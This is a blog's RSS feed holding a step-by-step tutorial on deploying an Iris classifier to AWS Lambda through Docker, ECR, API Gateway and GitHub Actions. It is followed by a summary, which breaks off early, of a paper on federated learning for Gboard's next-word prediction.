<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Shreyansh Singh</title>
    <link>https://shreyansh26.github.io/</link>
      <atom:link href="https://shreyansh26.github.io/index.xml" rel="self" type="application/rss+xml" />
    <description>Shreyansh Singh</description>
    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2022</copyright><lastBuildDate>Sun, 23 Jan 2022 21:15:03 +0530</lastBuildDate>
    <image>
      <url>https://shreyansh26.github.io/img/Shreyansh.jpg</url>
      <title>Shreyansh Singh</title>
      <link>https://shreyansh26.github.io/</link>
    </image>
    
    <item>
      <title>Deploying Machine Learning models using AWS Lambda and Github Actions - A Detailed Tutorial</title>
      <link>https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/</link>
      <pubDate>Sun, 23 Jan 2022 21:15:03 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/</guid>
      <description>&lt;hr&gt;
&lt;p&gt;Quite a while back, I had written a &lt;a href=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/&#34;&gt;post&lt;/a&gt; in which I described how to package your Machine Learning models using Docker and deploy them using Flask.&lt;/p&gt;
&lt;p&gt;This post, through a PoC, describes -&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;How to package your model using Docker (similar as last &lt;a href=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/&#34;&gt;post&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;How to push the Docker container to Amazon ECR&lt;/li&gt;
&lt;li&gt;Add a Lambda Function for your model&lt;/li&gt;
&lt;li&gt;Make a REST API using Amazon API Gateway to access your model&lt;/li&gt;
&lt;li&gt;Automate the whole process using Github Actions, so that any updates to the model can take effect immediately&lt;/li&gt;
&lt;li&gt;Make a Streamlit app to make a UI to access the REST API (for the model deployed on AWS)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;All the code can be found in my &lt;a href=&#34;https://github.com/shreyansh26/Iris_classification-AWS-Lambda-PoC&#34;&gt;Github repository&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The repository also contains the code to train, save and test a simple ML model on the Iris Dataset.&lt;/p&gt;
&lt;p&gt;The Iris dataset is a small dataset which contains attributes of the flower - Sepal length, Sepal width, Petal length and Petal width.
The goal of the task is to classify based on these dimensions, the type of the Iris, which in the dataset is among three classes - Setosa, Versicolour and Virginica.&lt;/p&gt;
&lt;h2 id=&#34;package-requirements&#34;&gt;Package Requirements&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;An Amazon Web Services account (I intentionally use a simple ML model to deploy as it remains in the AWS Free tier constraints across all the services I mention above. Larger models will require more storage and hence could be chargeable.)&lt;/li&gt;
&lt;li&gt;Python 3.6+&lt;/li&gt;
&lt;li&gt;A simple 
&lt;code&gt;pip install -r requirements.txt&lt;/code&gt; from the &lt;a href=&#34;iris_classification&#34;&gt;https://github.com/shreyansh26/Iris_classification-AWS-Lambda-PoC/tree/master/iris_classification&lt;/a&gt; directory will install the other Python packages required.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;steps-to-follow&#34;&gt;Steps to follow&lt;/h2&gt;
&lt;p&gt;In this PoC, I will be training and deploying a simple ML model. If you follow this tutorial, deploying complex models should be fairly easy as well. (I had to scratch my head a lot though!)&lt;/p&gt;
&lt;h3 id=&#34;1-training-and-deploying-the-model-locally&#34;&gt;1. Training and Deploying the model locally&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Clone this repo&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/shreyansh26/Iris_classification-AWS-Lambda-PoC
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Create a virtual environment - I use &lt;a href=&#34;https://docs.conda.io/en/latest/miniconda.html&#34;&gt;Miniconda&lt;/a&gt;, but you can use any method (virtualenv, venv)&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;conda create -n iris_project python=3.8
conda activate iris_project
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Install the required dependencies&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;pip install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Train the model&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;cd iris_classification/src
python train.py
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Verify the model trained correctly using pytest&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;pytest
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Activate Streamlit and run &lt;code&gt;app.py&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;streamlit run app.py
&lt;/code&gt;&lt;/pre&gt;












&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/ini-streamlit.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/ini-streamlit.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Right now, the &lt;code&gt;Predict AWS&lt;/code&gt; button will give an error on clicking. It is required to set up an API of your own that the code will send the POST request to.&lt;/p&gt;
&lt;p&gt;A &lt;code&gt;main.py&lt;/code&gt; file contains the event handler which will be used by Lambda later.&lt;/p&gt;
&lt;h3 id=&#34;2-packaging-the-model&#34;&gt;2. Packaging the model&lt;/h3&gt;
&lt;p&gt;I have included a Dockerfile which is used to package the model. Later I will automate all this using Github Actions.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd iris_classification
docker build --tag iris_classification:latest .
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;3-push-the-docker-container-to-amazon-ecr&#34;&gt;3. Push the Docker container to Amazon ECR&lt;/h3&gt;
&lt;p&gt;First, create a private repository. The free tier only allows for 500MB of storage in a month in a private repository.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/ecr1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/ecr1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Use the following set of commands to push the local Docker container to the created repository.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 863244415814.dkr.ecr.us-east-1.amazonaws.com

docker tag iris_classification:latest 863244415814.dkr.ecr.us-east-1.amazonaws.com/iris_classification:latest

docker push 863244415814.dkr.ecr.us-east-1.amazonaws.com/iris_classification:latest
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You may have to run&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;aws configure
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and provide your AWS Access Key ID and your AWS Secret Access Key to run the above commands successfully.&lt;/p&gt;
&lt;h3 id=&#34;4-create-a-lambda-function&#34;&gt;4. Create a Lambda function&lt;/h3&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/lambda1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/lambda1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The container image URI can be selected from the AWS console itself.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/lambda2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/lambda2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;5-test-the-lambda&#34;&gt;5. Test the Lambda&lt;/h3&gt;
&lt;p&gt;We can now test that the Lambda is correctly handling the request as we want it to. AWS allows for that. When we click on the Lambda function, it allows a Test option as well.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/lambda3.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/lambda3.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The test works and gives the correct result!!&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/lambda4.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/lambda4.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h3 id=&#34;6-create-an-api-from-the-amazon-api-gateway&#34;&gt;6. Create an API from the Amazon API Gateway&lt;/h3&gt;
&lt;p&gt;Make sure to make a REST API.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Add a &lt;code&gt;/classify&lt;/code&gt; resource to the API and and add a &lt;code&gt;POST&lt;/code&gt; method to the API.
Add a POST request to the API under a &lt;code&gt;/classify&lt;/code&gt; resource.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api3.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api3.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Integrate the Lambda function with the API.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api4.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api4.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Now, if you head back to the Lambda functions page, you will see that a Trigger has been added to the function.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api5.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/api5.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The endpoint is clearly visible in the screenshot.
It will be something like &lt;code&gt;https://{SOME_ID}.execute-api.us-east-1.amazonaws.com/test/classify&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;7-test-the-rest-api&#34;&gt;7. Test the REST API&lt;/h3&gt;
&lt;p&gt;We use a client like Postman to check the API.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/postman.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/postman.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h4 id=&#34;and-it-works&#34;&gt;AND IT WORKS!&lt;/h4&gt;
&lt;p&gt;Programmatically, we can also check that the API works.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests

url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://ti53furxkb.execute-api.us-east-1.amazonaws.com/test/classify&amp;#39;&lt;/span&gt;

myobj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;: [
        [&lt;span style=&#34;color:#ae81ff&#34;&gt;6.5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3.0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5.8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2.2&lt;/span&gt;],
        [&lt;span style=&#34;color:#ae81ff&#34;&gt;6.1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2.8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4.7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1.2&lt;/span&gt;]
    ]
}

x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(url, json &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; myobj)

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;{&amp;quot;prediction&amp;quot;: [&amp;quot;virginica&amp;quot;, &amp;quot;versicolor&amp;quot;], &amp;quot;log_proba&amp;quot;: [[-35.82910355985537, -1.5907654693356144, -0.22786665344763715], [-26.20011949521101, -0.0783441410298827, -2.585560434227453]]}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;this-works-too&#34;&gt;THIS WORKS TOO!&lt;/h4&gt;
&lt;p&gt;&lt;b&gt; The above API URL and endpoint will not work for you. You should replace it with your own endpoint URL. &lt;/b&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;streamlit-app-to-test-the-model&#34;&gt;Streamlit app to test the model&lt;/h2&gt;
&lt;p&gt;After making the appropriate changes to the configuration, running&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;streamlit run app.py
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;allows you to get the predictions from the AWS hosted model as well.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/fin-streamlit.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2022-01-23_model_deployment_using_aws_lambda/images/fin-streamlit.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h2 id=&#34;time-to-automate-the-whole-thing-using-github-actions&#34;&gt;Time to automate the whole thing using Github Actions&lt;/h2&gt;
&lt;p&gt;We use Github Actions to automate this whole process i.e. pushing the container to ECR, updating the Lambda function. The API then points to updated Lambda function automatically.&lt;/p&gt;
&lt;p&gt;First, we will need to add the &lt;code&gt;AWS_ACCESS_KEY_ID&lt;/code&gt; and &lt;code&gt;AWS_SECRET_ACCESS_KEY&lt;/code&gt; to Github secrets (in the Github repo settings).&lt;/p&gt;
&lt;p&gt;You can refer to the yml file in &lt;a href=&#34;https://github.com/shreyansh26/Iris_classification-AWS-Lambda-PoC/tree/master/.github/workflows&#34;&gt;.github/workflows&lt;/a&gt; to see how the automation works. The Github Action is triggered when a pull request is made to the &lt;code&gt;master&lt;/code&gt; branch.&lt;/p&gt;
&lt;p&gt;If required, you can also restrict any pushes to the master branch from Github (&lt;a href=&#34;https://stackoverflow.com/questions/46146491/prevent-pushing-to-master-on-github&#34;&gt;link&lt;/a&gt;).&lt;/p&gt;
&lt;h3 id=&#34;and-we-are-done&#34;&gt;AND WE ARE DONE!&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;That&amp;rsquo;s all for now!
I hope this tutorial helps you deploy your own models to AWS Lambda easily. Make sure to read the pricing for each AWS product you use to avoid being charged unknowingly.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PPML Series #3 - Federated Learning for Mobile Keyboard Prediction</title>
      <link>https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/</link>
      <pubDate>Mon, 27 Dec 2021 00:00:57 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/</guid>
      <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Gboard — the Google keyboard, is a virtual keyboard for smartphones with support for more than 900+ language varieties and over 1 billion installs. In addition to decoding noisy signals from input modalities including tap and word-gesture typing, Gboard provides auto-correction, word completion, and next-word prediction features.&lt;/p&gt;
&lt;p&gt;Next-word predictions provide a tool for facilitating text entry and is plays an important role in improving user experience. Based on a small amount of user-generated preceding text, language models (LMs) can predict the most probable
next word or phrase.&lt;/p&gt;
&lt;p&gt;The above figure shows an example: given the text, &amp;ldquo;I love you&amp;rdquo;, Gboard predicts the user is likely to type &amp;ldquo;and&amp;rdquo;, &amp;ldquo;too&amp;rdquo;, or &amp;ldquo;so much&amp;rdquo; next. The centre position
in the suggestion strip is reserved for the highest-probability candidate, while the second and third most likely candidates occupy the left and right positions, respectively.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt; -  The technical details shared in this post are based on the &lt;a href=&#34;https://arxiv.org/abs/1811.03604&#34;&gt;paper&lt;/a&gt; which was published by Google in 2019.  So, some details may be out-of-date, but the core idea behind the solution should still pretty much be the same. Checkout may annotated version of the paper &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/PPML/Federated%20Learning/Federated%20Learning%20for%20Mobile%20Keyboard%20Prediction.pdf&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The primary (static) language model for the English language in Gboard is a Katz smoothed Bayesian interpolated 5-gram LM containing 1.25 million n-grams, including 164,000 unigrams. You can read more about it in &lt;a href=&#34;https://research.google/pubs/pub37567/&#34;&gt;this paper&lt;/a&gt;. We won;t go into this much as the focus of the post is on the next-word prediction task.&lt;/p&gt;
&lt;p&gt;Another important point one should keep in mind is that mobile keyboard models are constrained in multiple ways - the models should be small, the inference time should be low. Users typically expect a visible keyboard response within 20 milliseconds of an input event. And, given the frequency with which mobile keyboard apps are used, client device batteries could be quickly depleted if CPU consumption were not constrained. As a result, language models are usually limited to tens of megabytes in size with vocabularies of hundreds of thousands of words.&lt;/p&gt;
&lt;p&gt;In the paper, the authors also discussed about how RNNs and more specifically LSTMs can be used for language modeling since they can utilize an arbitrary and dynamically-sized context window.&lt;/p&gt;
&lt;h2 id=&#34;where-does-federated-learning-come-in&#34;&gt;Where does Federated Learning come in?&lt;/h2&gt;
&lt;p&gt;For the task of next-word prediction, publicly available datasets could have been used. However, the training distribution of those datasets does not match the population distribution. Using sample user-generated text will require efforts such as logging, infrastructure, dedicated storage and security. And even still, some users might not be comfortable with the collection and remote storage of their personal data.&lt;/p&gt;
&lt;p&gt;For these reasons, the authors use federated learning. The federated learning environment gives users greater control over the use of their data and simplifies the task of incorporating privacy by default with distributed training and aggregation across a population of client devices. An RNN model is trained from scratch in the server and federated environments and achieves recall improvements with respect to the baseline, which is a &lt;a href=&#34;https://dl.acm.org/doi/10.5555/972695.972698&#34;&gt;n-gram finite state transducer (FST)&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;model-architecture-and-training&#34;&gt;Model Architecture and Training&lt;/h2&gt;
&lt;p&gt;A variant of LSTM called Coupled Input and Forget Gate (CIFG) is used. The coupled input and forget gate variant uses only one gate for modulating the input and the cell recurrent self-connections, i.e., &lt;i&gt;f&lt;/i&gt; = 1 - &lt;i&gt;i&lt;/i&gt;. Read more about CIFG in &lt;a href=&#34;https://arxiv.org/abs/1804.04849&#34;&gt;this paper&lt;/a&gt;. Since CIFG uses a single gate to control both the input and recurrent cell self-connections,  the number of parameters per cell is reduced by 25%.
For time step &lt;em&gt;t&lt;/em&gt;, input gate &lt;i&gt;i&lt;sub&gt;t&lt;/sub&gt;&lt;/i&gt; and forget gate &lt;i&gt;f&lt;sub&gt;t&lt;/sub&gt;&lt;/i&gt; have the relation&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/cifg.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-12-27_federated_learning_mobile_keyboard/images/cifg.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The CIFG architecture is advantageous for the mobile device environment because the number of computations and the parameter set size are reduced with no impact on model performance. The model is trained using Tensorflow and on-device inference is supported by Tensorflow Lite. Client device requirements limit the dictionary size to 10,000 words. CIFG&amp;rsquo;s input and output embedding size is 96. A single layer of CIFG with 670 units is used. Overall, 1.4 million parameters comprise the network. After weight quantization, the model shipped to Gboard devices is 1.4 megabytes in size.&lt;/p&gt;
&lt;p&gt;The training of the model was done using the FederatedAveraging (FedAvg) algorithm, which I wrote about in my &lt;a href=&#34;https://shreyansh26.github.io/post/2021-12-11_intro_to_federated_learning/&#34;&gt;previous blog post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;experiments&#34;&gt;Experiments&lt;/h2&gt;
&lt;p&gt;The paper shows the performance of the CIFG and the FST model on three datasets -  server-hosted logs data, client-held data and in live production experiments.&lt;/p&gt;
&lt;h4 id=&#34;server-based-logs&#34;&gt;Server-based logs&lt;/h4&gt;
